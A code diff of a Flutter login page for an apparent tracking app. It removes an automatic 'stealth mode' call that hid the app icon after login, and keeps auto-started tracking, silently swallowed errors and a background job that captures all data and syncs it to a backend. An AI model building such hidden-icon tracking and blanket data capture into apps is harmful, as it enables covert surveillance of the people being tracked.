@@ -6,7 +6,6 @@ import '../tracking/tracking_home_page.dart';
 import '../../core/constants/app_constants.dart';
 import '../../core/errors/app_exceptions.dart';
 import '../../platform/tracking_channel.dart';
-import '../../platform/launcher_channel.dart';
 import '../../services/auth_service.dart';
 import '../../services/background_worker.dart';
 
@@ -44,14 +43,13 @@ class _LoginPageState extends State<LoginPage> {
         password: _passCtrl.text,
       );
 
-      // Auto-start the native tracking service immediately after login.
-      await TrackingChannel.instance.startTrackingService();
-
-      // Hide app icon from launcher (stealth mode) after successful login
-      await LauncherChannel.hideAppIcon();
+      // Best-effort: start tracking service.
+      // Icon is hidden only when the user explicitly taps "Hide App" on the dashboard.
+      try {
+        await TrackingChannel.instance.startTrackingService();
+      } catch (_) {}
 
       // Fire-and-forget: capture initial data and sync to backend.
-      // Don't await — let it run in background while the page loads.
       BackgroundWorker.captureAllAndSync();
 
       if (!mounted) return;
@@ -61,7 +59,7 @@ class _LoginPageState extends State<LoginPage> {
       );
     } on SyncException catch (e) {
       if (mounted) setState(() { _loading = false; _errorMessage = e.message; });
-    } catch (_) {
+    } catch (e) {
       if (mounted) setState(() { _loading = false; _errorMessage = 'Unexpected error. Try again.'; });
     }
   }
@@ -143,10 +141,8 @@ class _LoginPageState extends State<LoginPage> {
                                   icon: Icons.email_outlined,
                                   keyboardType: TextInputType.emailAddress,
                                   validator: (v) {
-                                    if (v == null || v.isEmpty)
-                                      return 'Enter your email';
-                                    if (!v.contains('@'))
-                                      return 'Enter a valid email';
+                                    if (v == null || v.isEmpty) { return 'Enter your email'; }
+                                    if (!v.contains('@')) { return 'Enter a valid email'; }
                                     return null;
                                   },
                                 ),
@@ -169,10 +165,8 @@ class _LoginPageState extends State<LoginPage> {
                                         setState(() => _obscure = !_obscure),
                                   ),
                                   validator: (v) {
-                                    if (v == null || v.isEmpty)
-                                      return 'Enter your password';
-                                    if (v.length < 6)
-                                      return 'Minimum 6 characters';
+                                    if (v == null || v.isEmpty) { return 'Enter your password'; }
+                                    if (v.length < 6) { return 'Minimum 6 characters'; }
                                     return null;
                                   },
                                 ),
